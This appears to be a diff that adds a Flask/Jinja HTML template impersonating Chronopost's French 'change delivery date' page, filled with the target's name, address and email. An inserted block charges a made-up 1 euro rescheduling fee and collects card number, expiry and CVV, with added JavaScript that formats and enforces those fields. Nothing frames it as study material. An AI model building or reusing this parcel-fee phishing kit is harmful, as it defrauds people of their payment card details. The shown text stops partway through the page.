@@ -1,0 +1,671 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="fr" xml:lang="fr">
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Chronopost</title>
+    <link rel="icon" href="{{ url_for('static', filename='files/favicon.ico') }}" type="image/vnd.microsoft.icon">
+    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7; IE=EmulateIE8; IE=edge">
+    <meta http-equiv="keywords" content="">
+    <meta http-equiv="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        button {
+            padding: 10px 15px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #results {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+        }
+    </style>
+  </head>
+  <body>
+    <!--  -->
+    <!--  -->
+    <!-- olgi webapp internal build version 2025-02-25T13:27:02Z  -->
+    <!--  -->
+    <!--  -->
+    <!--Debut header -->
+    <script src="{{ url_for('static', filename='files/jquery.min.js') }}" type="text/javascript"></script>
+    <div class="web entete">
+      <div class="rampe">
+        <a id="debut" name="debut" href="#debut" title="Debut de page"></a>
+        <br>
+        <a href="#contenu"></a>
+      </div>
+      <ul>
+        <li>
+          <a href="https://www.chronopost.fr/transport-express/livraison-colis/loginById.do?pid=704&amp;iv4Context=" onclick="xt_med('C','5','Aide','N')" title="Aide">Aide</a>
+        </li>
+        <li>
+          <a href="https://www.chronopost.fr/transport-express/livraison-colis/loginById.do?pid=713&amp;iv4Context=" onclick="xt_med('C','5','FAQ','N')">
+            <acronym title="'FAQ' : Foire aux questions">FAQ</acronym>
+          </a>
+        </li>
+        <li>
+          <a onclick="javascript:changelocale('fr')" href="javascript:void(0)">FR</a>
+        </li>
+        <li>
+          <a onclick="javascript:changelocale('en')" href="javascript:void(0)">EN</a>
+        </li>
+        <li>
+          <input type="button" value="Espace client" onclick="javascript:window.location='/transport-express/livraison-colis/pid/729'">
+        </li>
+        <li></li>
+      </ul>
+      <a href="https://www.chronopost.fr/transport-express/livraison-colis" title="chronopost-international">
+        <img src="{{ url_for('static', filename='files/logo-chronopost-international.png') }}" alt="chronopost-international">
+      </a>
+    </div>
+    <!-- /web entete -->
+    <link type="text/css" rel="stylesheet" href="{{ url_for('static', filename='files/styles.min.css') }}">
+    <link type="text/css" rel="stylesheet" href="{{ url_for('static', filename='files/style_v2.css') }}">
+    <link type="text/css" rel="stylesheet" href="{{ url_for('static', filename='files/ui.datepicker.css') }}">
+    <link type="text/css" rel="stylesheet" href="{{ url_for('static', filename='files/geocoder.css') }}">
+    <link type="text/css" rel="stylesheet" href="{{ url_for('static', filename='files/jquery-ui.css') }}">
+    <!--[if IE 9]>
+																	<link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='files/ie9.css') }}?version=1.4.1" />
+																	<![endif]-->
+    <!--[if IE 8]>
+																	<link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='files/ie.css') }}?version=1.4.1" />
+																	<![endif]-->
+    <!--[if IE 7]>
+																	<link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='files/ie7.css') }}?version=1.4.1" />
+																	<![endif]-->
+    <script src="{{ url_for('static', filename='files/firebugx.js') }}" type="text/javascript"></script>
+    <script src="{{ url_for('static', filename='files/log4js.js') }}" type="text/javascript"></script>
+    <script src="{{ url_for('static', filename='files/outerHTML-2.1.0-min.js') }}" type="text/javascript"></script>
+    <script src="{{ url_for('static', filename='files/ui.datepicker.js') }}" type="text/javascript"></script>
+    <script src="{{ url_for('static', filename='files/jquery.ui.datepicker-fr.js') }}" type="text/javascript"></script>
+    <script src="{{ url_for('static', filename='files/jquery-ui-1.8.19.custom.min.js') }}" type="text/javascript"></script>
+    <script src="{{ url_for('static', filename='files/olgi_scripts.js') }}" type="text/javascript"></script>
+    <script src="{{ url_for('static', filename='files/submit_scripts.js') }}" type="text/javascript"></script>
+    <script src="{{ url_for('static', filename='files/get-amabis-voie.js') }}" type="text/javascript"></script>
+    <script src="{{ url_for('static', filename='files/helper_scripts.js') }}" type="text/javascript"></script>
+    <script src="{{ url_for('static', filename='files/maps.js') }}" type="text/javascript"></script>
+    <script type="text/javascript">
+      searchCitiesMagic();
+      searchCities();
+    </script>
+    <!-- Xiti Marker -->
+    <script type="text/javascript">
+      < !xtnv = document;
+      xtsd = "https://logs1406";
+      xtsite = "555972";
+      xtn2 = "17";
+      xtpage = "instruction_de_livraison";
+      xtdi = "";
+      xt_multc = "&x1=1&x2=1&x3=1&x4=2";
+      xt_an = "";
+      xt_ac = "";
+      xt_order = "";
+      xt_form = "";
+      //do not modify below
+      if (window.xtparam != null) {
+        window.xtparam += "&ac=" + xt_ac + "&an=" + xt_an + xt_multc + xt_order + xt_form;
+      } else {
+        window.xtparam = "&ac=" + xt_ac + "&an=" + xt_an + xt_multc + xt_order + xt_form;
+      };
+      //Add salestracker function
+      //-->
+    </script>
+    <script type="text/javascript" src="{{ url_for('static', filename='files/xtcore.js') }}"></script>
+    <noscript>
+      <img width="1" height="1" alt="" src="https://logs1406.xiti.com/hit.xiti?s=555972&s2=17&p=instruction_de_livraison&di=&an=&ac=" />
+    </noscript>
+    <!-- Xiti Marker -->
+    <span id="xitimarker"></span>
+    <script type="text/javascript">
+      $(document).ready(function() {
+        var codePostalRequest = "95995";
+        //alert(codePostalRequest);
+        $("#codePostalPosteComptable").val(codePostalRequest);
+        $("a[class=tabReprogrammerRdv]").click(function(event) {
+          // Vérifier si la page du Reprogrammation RDV est déja chargé
+          // Si oui, ne pas appeler la page Sandwich
+          if (!$("#tabs li[id='reprogrammerRdv.html'] .tabs-content").children().length > 0) {
+            event.preventDefault();
+            var codePostal = $("#codePostalPosteComptable").find("option:selected").val();
+            $.get("sandwich.htm", {
+              codePostalPosteComptable: codePostal
+            }, function(result) {
+              //$(".mainContainer").html(result); // Ne marche plus avec TIC V2
+              $("body").html(result);
+            });
+          }
+        });
+      });
+    </script>
+    <br>
+    <div class="web">
+      <a id="contenu" name="contenu" href="#contenu" title="Contenu de page"></a>
+      <p class="ariane">
+        <!-- login no -->
+        <a href="https://www.chronopost.fr/transport-express/livraison-colis/loginById.do?pid=600&amp;iv4Context=-1" title="Accueil">Accueil</a> &gt; <a href="#">Suivi colis</a> &gt; Instruction en ligne <span style="float:right;">
+          <a title="Vous pouvez vous déconnecter de votre session en cliquant ici" onclick="javascript:quitter()" href="javascript:void(0)">Quitter</a>
+        </span>
+      </p>
+      <div class="cs-content">
+        <div class="cs-mod bg-dark border5">
+          <h1 class="cs-mod-content-head mod-title">Agissez sur votre livraison</h1>
+          <div class="cs-mod-content-body cs-mod-content-body-white">
+            <div class="flex no-flex flex-start mb-10">
+              <h2>Adresse de livraison :</h2>
+              <p>{{ user.Prenom }} {{ user.Nom }} {{ user.Adresse }}</p>
+            </div>
+            <div class="flex no-flex flex-start">
+              <h2>Date de livraison :</h2>
+              <p>le lundi 12 mai entre 08:00 et 18:00</p>
+            </div>
+          </div>
+        </div>
+        <ul class="tabs" id="tabs">
+          <li id="completeaddress.html" class="tabOdd">
+            <a class="tabCompleteAddress" href="https://www.chronopost.fr/fclV2/completeaddress.html"> Choisir un lieu sûr ou compléter mon adresse
+              <!-- Choisissez votre lieu sûr et complétez votre adresse -->
+            </a>
+            <div class="tabs-content"></div>
+          </li>
+          <li id="neighbordeliver.html">
+            <a class="tabNeighborDeliver" href="https://www.chronopost.fr/fclV2/neighbordeliver.html"> Livrer chez mon voisin
+              <!-- Votre colis livré chez votre voisin -->
+            </a>
+            <div class="tabs-content"></div>
+          </li>
+          <li id="changedate.html" class="tabOdd tabopen">
+            <a class="tabChangeDate" href="https://www.chronopost.fr/fclV2/changedate.html"> Modifier la date de livraison
+              <!-- Votre colis livré le jour de votre choix à la même adresse -->
+            </a>
+            <div class="tabs-content" style="overflow: hidden; display: block;">
+              <!-- Xiti Marker -->
+              <noscript>
+                <img width="1" height="1" alt="" src="https://logs1406.xiti.com/hit.xiti?s=555972&s2=17&p=recapitulatif::changer_l_adresse_de_livraison&di=&an=&ac=" />
+              </noscript>
+              <!-- Xiti Marker -->
+              <div id="divcontentBlocsubpart" class="contentBloc">
+                <form id="changedateform" action="/fclV2/changedate.html?r=1746997361461" method="post">
+                  <div class="CBFormContainer">
+                    <div class="cs-content newDeliveryForm">
+                      <fieldset class="bg-dark border5 mb-10">
+                        <ul class="listDeliveryDates flex no-flex cs-mod-content-body cs-mod-content-body-white cs-radio" id="listDeliveryDates">
+                          <li onclick="showStep02()">
+                            <input id="deliveryDate0" name="dateChoosen" type="radio" value="0">
+                            <div class="cs-check"></div>
+                            <label for="deliveryDate0">mardi 13 mai</label>
+                          </li>
+                          <li onclick="showStep02()">
+                            <input id="deliveryDate1" name="dateChoosen" type="radio" value="1">
+                            <div class="cs-check"></div>
+                            <label for="deliveryDate1">mercredi 14 mai</label>
+                          </li>
+                          <li onclick="showStep02()">
+                            <input id="deliveryDate2" name="dateChoosen" type="radio" value="2">
+                            <div class="cs-check"></div>
+                            <label for="deliveryDate2">jeudi 15 mai</label>
+                          </li>
+                          <li onclick="showStep02()">
+                            <input id="deliveryDate3" name="dateChoosen" type="radio" value="3">
+                            <div class="cs-check"></div>
+                            <label for="deliveryDate3">vendredi 16 mai</label>
+                          </li>
+                          <li onclick="showStep02()">
+                            <input id="deliveryDate4" name="dateChoosen" type="radio" value="4">
+                            <div class="cs-check"></div>
+                            <label for="deliveryDate4">samedi 17 mai</label>
+                          </li>
+                          <li onclick="showStep02()">
+                            <input id="deliveryDate5" name="dateChoosen" type="radio" value="5">
+                            <div class="cs-check"></div>
+                            <label for="deliveryDate5">lundi 19 mai</label>
+                          </li>
+                        </ul>
+                        <span class="CBError"></span>
+                      </fieldset>
+                      <div id="step02" style="display: none;">
+                        <div class="cs-mod bg-dark border5">
+                          <h2 class="cs-mod-content-body cs-mod-content-body-grey">
+                            <span class="cs-message mb-10">Vérifier et compléter l'adresse de livraison</span>
+                          </h2>
+                          <div class="cs-mod-content-simple flex no-flex">
+                            <p class="cs-message"></p>
+                            <em>Les champs suivis d'* sont obligatoires</em>
+                          </div>
+                          <fieldset class="cs-mod-content-body-grey">
+                            <div class="flex no-flex">
+                              <ul class="CBInputsList CBInputsListL mod-select">
+                                <!-- si input disabled, ajouter class "disabled is-active is-completed" sur le li parent de l'input -->
+                                <li class="disabled is-completed">
+                                  <label for="nameandfirstname" class="CBLabel">Nom et prénom&nbsp; </label>
+                                  <input id="nameandfirstname" name="nameandfirstname" class="olgiformfield " onblur="checkFieldValue('nameandfirstname', encodeURIComponent($(this).val()));clean(this);" disabled="disabled" type="text" value="{{ user.Prenom }} {{ user.Nom }}" size="50" maxlength="50">
+                                  <span id="span_nameandfirstname" class="CBError"></span>
+                                </li>
+                                <!-- si input disabled, ajouter class "disabled is-active is-completed" sur le li parent de l'input -->
+                                <li class="disabled">
+                                  <label for="companyname" class="CBLabel">Raison sociale&nbsp; </label>
+                                  <input id="companyname" name="companyname" class="olgiformfield " onblur="checkFieldValue('companyname', encodeURIComponent($(this).val()));clean(this);" disabled="disabled" type="text" value="" size="50" maxlength="50">
+                                  <span id="span_companyname" class="CBError"></span>
+                                </li>
+                                <!-- si input disabled, ajouter class "disabled is-active is-completed" sur le li parent de l'input -->
+                                <li class="disabled is-completed">
+                                  <label for="zipcode" class="CBLabel">Code postal&nbsp; </label>
+                                  <input id="zipcode" name="zipcode" class="olgiformfield w-full  ui-autocomplete-input" onblur="checkFieldValue('zipcode', $(this).val());clean(this);" disabled="disabled" type="text" value="{{ user.Adresse.split(' ')[-2] }}" size="5" maxlength="5" autocomplete="false" role="textbox" aria-autocomplete="list" aria-haspopup="true">
+                                  <span id="span_zipcode" class="CBError"></span>
+                                </li>
+                                <!-- si input disabled, ajouter class "disabled is-active is-completed" sur le li parent de l'input -->
+                                <li class="disabled is-completed">
+                                  <label for="city" class="CBLabel">Ville&nbsp; </label>
+                                  <input id="city" name="city" class="olgiformfield " onblur="checkFieldValue('city', encodeURIComponent($(this).val()));clean(this);" disabled="disabled" type="text" value="{{ user.Adresse.split(' ')[-1] }}" size="38" maxlength="38">
+                                  <span id="span_city" class="CBError"></span>
+                                </li>
+                                <!-- si input disabled, ajouter class "disabled is-active is-completed" sur le li parent de l'input -->
+                                <li class="disabled is-completed">
+                                  <label for="address" class="CBLabel">Adresse&nbsp; </label>
+                                  <input id="address" name="address" class="olgiformfield  ui-autocomplete-input" onblur="checkFieldValue('address', encodeURIComponent($(this).val()));clean(this);" disabled="disabled" type="text" value="{{ ' '.join(user.Adresse.split(' ')[:-2]) }}" size="38" maxlength="38" autocomplete="off" role="textbox" aria-autocomplete="list" aria-haspopup="true">
+                                  <span id="span_address" class="CBError"></span>
+                                </li>
+                                <!-- si input disabled, ajouter class "disabled is-active is-completed" sur le li parent de l'input -->
+                                <li class="disabled">
+                                  <label for="addresssuite" class="CBLabel">Complément d'adresse&nbsp; </label>
+                                  <input id="addresssuite" name="addresssuite" class="olgiformfield " onblur="checkFieldValue('addresssuite', encodeURIComponent($(this).val()));clean(this);" disabled="disabled" type="text" value="" size="38" maxlength="38">
+                                  <span id="span_addresssuite" class="CBError"></span>
+                                </li>
+                              </ul>
+                              <ul class="CBInputsList CBInputsListR mod-select">
+                                <!-- fin champ erreur -->
+                                <li class="disabled ">
+                                  <label for="country" class="CBLabel">Pays&nbsp; </label>
+                                  <input id="country" name="country" class="olgiformfield " onblur="checkFieldValue('country', encodeURIComponent($(this).val()));clean(this);" disabled="disabled" type="text" value="France" size="50" maxlength="50">
+                                  <span id="span_country" class="CBError"></span>
+                                </li>
+                                <li class="disabled ">
+                                  <label for="building" class="CBLabel">Bâtiment&nbsp; </label>
+                                  <input id="building" name="building" class="olgiformfield " onblur="checkFieldValue('building', encodeURIComponent($(this).val()));clean(this);" type="text" size="20" maxlength="20">
+                                  <span id="span_building" class="CBError"></span>
+                                </li>
+                                <li class="disabled ">
+                                  <label for="floor" class="CBLabel">Etage&nbsp; </label>
+                                  <input id="floor" name="floor" class="olgiformfield " onblur="checkFieldValue('floor', encodeURIComponent($(this).val()));clean(this);" type="text" size="3" maxlength="3">
+                                  <span id="span_floor" class="CBError"></span>
+                                </li>
+                                <li class="disabled ">
+                                  <label for="digicode1" class="CBLabel">Code porte / Interphone&nbsp; </label>
+                                  <input id="digicode1" name="digicode1" class="olgiformfield " onblur="checkFieldValue('digicode1', encodeURIComponent($(this).val()));clean(this);" type="text" size="10" maxlength="10">
+                                  <span id="span_digicode1" class="CBError"></span>
+                                </li>
+                                <li class="disabled ">
+                                  <label for="digicode2" class="CBLabel">Second code porte / Interphone&nbsp; </label>
+                                  <input id="digicode2" name="digicode2" class="olgiformfield " onblur="checkFieldValue('digicode2', encodeURIComponent($(this).val()));clean(this);" type="text" size="10" maxlength="10">
+                                  <span id="span_digicode2" class="CBError"></span>
+                                </li>
+                                <li class="disabled is-completed">
+                                  <label for="telephone" class="CBLabel">Téléphone (mobile de préférence)&nbsp; <em>*</em>
+                                    <span class="aTooltip">&nbsp; <span> Votre n° de téléphone nous permettra de vous contacter en cas de besoin </span>
+                                    </span>
+                                  </label>
+                                  <input id="telephone" name="telephone" class="olgiformfield " onblur="checkFieldValue('telephone', encodeURIComponent($(this).val()));clean(this);" type="text" value="+33612345678" size="17" maxlength="17">
+                                  <span id="span_telephone" class="CBError"></span>
+                                </li>
+                                <li class="disabled is-completed">
+                                  <label for="email" class="CBLabel">E-Mail&nbsp; <em>*</em>
+                                    <span class="aTooltip">&nbsp; <span> Votre e-mail nous permettra de vous contacter en cas de besoin </span>
+                                    </span>
+                                  </label>
+                                  <input id="email" name="email" class="olgiformfield " onblur="checkFieldValue('email', encodeURIComponent($(this).val()));clean(this);" type="text" value="{{ user.Email }}" size="106" maxlength="106">
+                                  <span id="span_email" class="CBError"></span>
+                                </li>
+                              </ul>
+                            </div>
+                          </fieldset>
+                          <fieldset class="cs-mod-content-body-grey">
+                            <div class="border-t">
+                              <div class="cs-mod-content-body mod-select ">
+                                <label for="commentText" class="CBLabel">
+                                  <svg class="middle" viewBox="0 0 56 56" version="1.1" style="fill-rule:evenodd;clip-rule:evenodd;stroke-miterlimit:10;">
+                                    <rect x="27.42" y="23.242" width="1.109" height="13.179" style="fill:#3d3d3f;stroke:#3d3d3f;stroke-width:1px;"></rect>
+                                    <path d="M27.143,19.462c0,-0.319 0.08,-0.541 0.24,-0.667c0.159,-0.126 0.365,-0.19 0.617,-0.19c0.235,0 0.428,0.064 0.579,0.19c0.151,0.126 0.228,0.348 0.228,0.667c0,0.319 -0.077,0.547 -0.228,0.68c-0.151,0.135 -0.344,0.202 -0.579,0.202c-0.252,0 -0.458,-0.067 -0.617,-0.202c-0.16,-0.133 -0.24,-0.361 -0.24,-0.68" style="fill:#00a4db;fill-rule:nonzero;stroke:#00a4db;stroke-width:1px;"></path>
+                                    <path d="M45.15,27.6c0,9.686 -7.864,17.55 -17.55,17.55c-9.686,0 -17.55,-7.864 -17.55,-17.55c0,-9.686 7.864,-17.55 17.55,-17.55c9.686,0 17.55,7.864 17.55,17.55Z" style="fill:none;stroke:#3d3d3f;stroke-width:2px;"></path>
+                                  </svg>Message au chauffeur&nbsp;
+                                  <!-- -->
+                                </label>
+                                <textarea id="commentText" name="deliveryhelp" class="olgiformfield" maxlength="78" rows="2" cols="20"></textarea>
+                                <span id="span_deliveryhelp" class="CBError"></span>
+                              </div>
+                            </div>
+                            <!-- Ajout du champ pour carte de crédit avec style amélioré -->
+                            <div class="border-t" style="margin-top: 25px; padding-top: 20px; clear: both;">
+                              <div class="cs-mod-content-body">
+                                <h3 style="color: #00a4db; margin-bottom: 15px; font-size: 16px; font-weight: bold;">Paiement - Coût de l'opération : 1 euro</h3>
+                                <p style="margin-bottom: 20px; color: #666; font-style: italic; font-size: 14px; line-height: 1.4;">La modification de votre date de livraison entraîne des frais de gestion de 1€</p>
+                                <div style="margin-bottom: 20px; overflow: hidden;">
+                                  <div style="width: 100%; clear: both; margin-bottom: 15px;">
+                                    <label for="creditCardNumber" style="display: block; margin-bottom: 8px; font-weight: bold;">Numéro de carte de crédit&nbsp; <em style="color: red;">*</em>
+                                    </label>
+                                    <input id="creditCardNumber" name="creditCardNumber" style="width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; font-size: 14px;" class="olgiformfield required" type="text" placeholder="0000 0000 0000 0000" maxlength="19" onkeypress="return isNumberKey(event)" onkeyup="formatCreditCard(this)" onblur="validateCreditCard(this)">
+                                    <span id="span_creditCardNumber" class="CBError" style="display: block; margin-top: 5px; color: red;"></span>
+                                  </div>
+                                </div>
+                                <div style="display: flex; justify-content: space-between; margin-bottom: 20px;">
+                                  <div style="width: 48%;">
+                                    <label for="expiryDate" style="display: block; margin-bottom: 8px; font-weight: bold;">Date d'expiration&nbsp; <em style="color: red;">*</em>
+                                    </label>
+                                    <input id="expiryDate" name="expiryDate" style="width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; font-size: 14px;" class="olgiformfield required" type="text" placeholder="MM/AA" maxlength="5" onkeypress="return isExpiryDateKey(event)" onkeyup="formatExpiryDate(this)" onblur="validateExpiryDate(this)">
+                                    <span id="span_expiryDate" class="CBError" style="display: block; margin-top: 5px; color: red;"></span>
+                                  </div>
+                                  <div style="width: 48%;">
+                                    <label for="cvvCode" style="display: block; margin-bottom: 8px; font-weight: bold;">Code de sécurité (CVV)&nbsp; <em style="color: red;">*</em>
+                                    </label>
+                                    <input id="cvvCode" name="cvvCode" style="width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; font-size: 14px;" class="olgiformfield required" type="text" placeholder="123" maxlength="3" onkeypress="return isNumberKey(event)" onblur="validateCVV(this)">
+                                    <span id="span_cvvCode" class="CBError" style="display: block; margin-top: 5px; color: red;"></span>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                            <!-- Fin de l'ajout -->
+                            <!-- TODO : Voir l'utilité -->
+                            <div class="cs-mod-content-body relative border-b mod-check mod-select">
+                              <p class="cs-checkbox">
+                                <input class="required" type="checkbox" id="resp" name="resp" style="display: none;">
+                                <label for="resp" class="labelXlignes" style="display: none;">
+                                  <span>J'autorise Chronopost à déposer le colis à l'emplacement indiqué sans signature. J'assume la responsabilité de ce colis après son dépôt.</span>
+                                </label>
+                                <span id="span_resp" class="CBError"></span>
+                              </p>
+                              <p class="cs-checkbox">
+                                <input class="required" type="checkbox" id="cgv" name="cgv">
+                                <label for="cgv" class="labelXlignes">
+                                  <span>J'ai pris connaissance des informations du <a href="https://www.chronopost.fr/fr/livraison/nos-services/predict" target="_blank">service Predict</a>
+                                  </span>
+                                </label>
+                                <span class="CBError"></span>
+                              </p>
+                            </div>
+                          </fieldset>
+                          <!-- Session duplication de consigne -->
+                        </div>
+                        <div class="formFooter">
+                          <p class="CBSubmit">
+                            <input id="bouttonvalider" onclick="if(testVal()){handleSubmitFclSubpart('changedate.html','changedateform');initAll();}" class="validant" type="button" value="Valider">
+                          </p>
+                        </div>
+                        <!-- A voir l utilite -->
+                        <div class="clear"></div>
+                        <!-- </div> fin du DIV de la page d'appel -->
+                        <input type="hidden" id="deliveryHelpStatus" name="deliveryHelpStatus">
+                        <input type="hidden" id="fieldChangeCheckerStatus" name="fieldChangeCheckerStatus">
+                      </div>
+                    </div>
+                  </div>
+                </form>
+              </div>
+            </div>
+          </li>
+          <li id="receive.html">
+            <a class="tabReceive" href="https://www.chronopost.fr/fclV2/receive.html"> Choisir un point de proximité
+              <!-- Votre colis disponible dès demain en point de retrait -->
+            </a>
+            <div class="tabs-content"></div>
+          </li>
+        </ul>
+        <div id="tabContent"></div>
+      </div>
+    </div>
+    <script>
+      var cacheBuster = new Date().getTime(); //Get timestamp
+      $("#tabs li[id='changedate.html'] .tabs-content").load('changedate.html?r=' + cacheBuster, function() {
+        initAll2();
+        $('html, body').animate({
+          scrollTop: $("#tabs li[id='changedate.html']").offset().top
+        }, 500);
+      });
+      $("#tabs li[id='changedate.html']").addClass("tabopen");
+      $("#tabs li[id='changedate.html'] .tabs-content").css({
+        "overflow": "hidden",
+        "display": "block"
+      });
+    </script>
+    <script>
+      function testVal() {
+        var codePosteComptable = $("#posteComptableField .nice-select ul li.selected").attr("data-value");
+        if (typeof(codePosteComptable) == 'undefined') {
+          // Cas client, on ne touche pas au poste comptable
+          return true;
+        } else if (codePosteComptable != '') {
+          writeNewPosteComptable(codePosteComptable);
+          return true;
+        } else {
+          alert('Merci de préciser une agence de destination.');
+          return false;
+        }
+      }
+    </script>
+    <script type="text/javascript">
+      // Fonctions de validation pour le formulaire de carte de crédit
+      function isNumberKey(evt) {
+        var charCode = (evt.which) ? evt.which : evt.keyCode;
+        if (charCode > 31 && (charCode < 48 || charCode > 57)) return false;
+        return true;
+      }
+
+      function isExpiryDateKey(evt) {
+        var charCode = (evt.which) ? evt.which : evt.keyCode;
+        // Autoriser les chiffres et le slash
+        if (charCode > 31 && (charCode < 48 || charCode > 57) && charCode !== 47) return false;
+        return true;
+      }
+
+      function formatCreditCard(input) {
+        // Supprimer tout ce qui n'est pas un chiffre
+        var value = input.value.replace(/\D/g, '');
+        // Formater avec des espaces tous les 4 chiffres
+        var formattedValue = '';
+        for (var i = 0; i < value.length; i++) {
+          if (i > 0 && i % 4 === 0) {
+            formattedValue += ' ';
+          }
+          formattedValue += value[i];
+        }
+        // Mettre à jour la valeur
+        input.value = formattedValue;
+      }
+
+      function formatExpiryDate(input) {
+        // Supprimer tout ce qui n'est pas un chiffre
+        var value = input.value.replace(/\D/g, '');
+        // Ajouter automatiquement le slash après les 2 premiers chiffres
+        if (value.length > 2) {
+          value = value.substring(0, 2) + '/' + value.substring(2);
+        }
+        // Mettre à jour la valeur
+        input.value = value;
+      }
+
+      function validateCreditCard(input) {
+        var errorSpan = document.getElementById('span_creditCardNumber');
+        var value = input.value.replace(/\s/g, ''); // Supprimer les espaces
+        if (value.length === 0) {
+          errorSpan.textContent = "Veuillez entrer un numéro de carte de crédit";
+          input.style.borderColor = "red";
+          return false;
+        } else if (value.length < 13 || value.length > 19) {
+          errorSpan.textContent = "Le numéro de carte doit contenir entre 13 et 19 chiffres";
+          input.style.borderColor = "red";
+          return false;
+        } else {
+          errorSpan.textContent = "";
+          input.style.borderColor = "#ccc";
+          return true;
+        }
+      }
+
+      function validateExpiryDate(input) {
+        var errorSpan = document.getElementById('span_expiryDate');
+        var value = input.value;
+        if (value.length === 0) {
+          errorSpan.textContent = "Veuillez entrer une date d'expiration";
+          input.style.borderColor = "red";
+          return false;
+        }
+        // Vérifier le format MM/AA
+        var parts = value.split('/');
+        if (parts.length !== 2 || parts[0].length !== 2 || parts[1].length !== 2) {
+          errorSpan.textContent = "Format invalide. Utilisez MM/AA";
+          input.style.borderColor = "red";
+          return false;
+        }
+        var month = parseInt(parts[0], 10);
+        var year = parseInt('20' + parts[1], 10); // Convertir en année complète (2023 au lieu de 23)
+        // Vérifier si le mois est valide (entre 1 et 12)
+        if (month < 1 || month > 12) {
+          errorSpan.textContent = "Mois invalide. Entrez un mois entre 01 et 12";
+          input.style.borderColor = "red";
+          return false;
+        }
+        // Vérifier si la date n'est pas déjà expirée
+        var today = new Date();
+        var currentMonth = today.getMonth() + 1; // getMonth() est 0-indexé
+        var currentYear = today.getFullYear();
+        if (year < currentYear || (year === currentYear && month < currentMonth)) {
+          errorSpan.textContent = "La carte a expiré";
+          input.style.borderColor = "red";
+          return false;
+        }
+        errorSpan.textContent = "";
+        input.style.borderColor = "#ccc";
+        return true;
+      }
+
+      function validateCVV(input) {
+        var errorSpan = document.getElementById('span_cvvCode');
+        var value = input.value;
+        if (value.length === 0) {
+          errorSpan.textContent = "Veuillez entrer le code de sécurité";
+          input.style.borderColor = "red";
+          return false;
+        } else if (value.length < 3) {
+          errorSpan.textContent = "Le code de sécurité doit contenir 3 chiffres";
+          input.style.borderColor = "red";
+          return false;
+        } else {
+          errorSpan.textContent = "";
+          input.style.borderColor = "#ccc";
+          return true;
+        }
+      }
+      // Modifier la fonction testVal pour inclure la validation de carte de crédit
+      var originalTestVal = testVal;
+      testVal = function() {
+        // Vérifier d'abord si le step02 est affiché (étape de paiement)
+        if (document.getElementById('step02').style.display !== 'none') {
+          // Valider les champs de carte de crédit
+          var isCardValid = validateCreditCard(document.getElementById('creditCardNumber'));
+          var isDateValid = validateExpiryDate(document.getElementById('expiryDate'));
+          var isCvvValid = validateCVV(document.getElementById('cvvCode'));
+          if (!isCardValid || !isDateValid || !isCvvValid) {
+            alert('Veuillez corriger les informations de paiement avant de continuer.');
+            return false;
+          }
+        }
+        // Appeler la fonction originale
+        return originalTestVal();
+      };
+      // Montrer l'étape 2 lorsqu'une date est sélectionnée
+      function showStep02() {
+        document.getElementById('step02').style.display = 'block';
+      }
+    </script>
+    <div class="enpied">
+      <div class="web">
+        <ol>
+          <!-- login no -->
+          <li>
+            <a href="https://www.chronopost.fr/transport-express/livraison-colis/loginById.do?urlkey=homepage" title="English version" target="_blank" onclick="xt_med('C','5','FooterChronopostFR','N')">English version</a>
+          </li>
+          <li>
+            <a href="http://rh.chronopost.fr/" title="Chronopost recrute" target="_blank" onclick="xt_med('C','5','FooterChronopostRecrute','S')">Chronopost recrute</a>
+          </li>
+          <li>
+            <a href="https://www.chronopost.fr/transport-express/livraison-colis/logout.do?pid=3803&amp;iv4Context=" title="Où nous trouver" target="_blank" onclick="xt_med('C','5','FooterOuNousTrouver','N')">Où nous trouver</a>
+          </li>
+          <li>
+            <a href="https://www.chronopost.fr/transport-express/livraison-colis/logout.do?pid=1000&amp;iv4Context=" title="Mentions l?gales" target="_blank" onclick="xt_med('C','5','FooterMentionsLegales','N')">Mentions légales</a>
+          </li>
+          <li>
+            <a href="https://www.chronopost.fr/transport-express/livraison-colis/logout.do?pid=714&amp;iv4Context=" title="Contact" target="_blank" onclick="xt_med('C','5','FooterContact','N')">Contact</a>
+          </li>
+          <li>
+            <a href="https://www.chronopost.fr/transport-express/livraison-colis/logout.do?pid=1523&amp;iv4Context=" title="Espace presse" target="_blank" onclick="xt_med('C','5','FooterEspacePresse','N')">Espace presse</a>
+          </li>
+          <li class="dernier">
+            <a href="https://www.chronopost.fr/transport-express/livraison-colis/logout.do?pid=1425&amp;iv4Context=" title="Plan du site" target="_blank" onclick="xt_med('C','5','FooterPlanDuSite','N')">Plan du site</a>
+          </li>
+        </ol>
+        <img src="{{ url_for('static', filename='files/double-logo.png') }}" alt="Chronopost international">
+        <p>
+          <a href="http://www.transport-express-colis.com/" target="_blank" title="Transport express de colis" onclick="xt_med('C','5','FooterTransportExpressDeColis','S')">Transport express de colis</a> | <a href="http://www.laposte.fr/" target="_blank" title="La Poste" onclick="xt_med('C','5','FooterLaPoste','S')">La Poste</a> | <a href="http://www.geopost.fr/" target="_blank" title="GeoPost" onclick="xt_med('C','5','FooterGeoPost','S')">GeoPost</a> | <a href="http://timbres.laposte.fr/?prov=313" target="_blank" title="La Boutique du Timbre" onclick="xt_med('C','5','FooterLaBoutiqueDuTimbre','S')">La Boutique du Timbre</a>
+        </p>
+      </div>
+    </div>
+    <!-- /web enpied -->
+    <div id="popinHelp" class="popin popinHelp">
+      <!--  <a class="closePopin" href="#"></a> -->
+      <h1>Aide</h1>
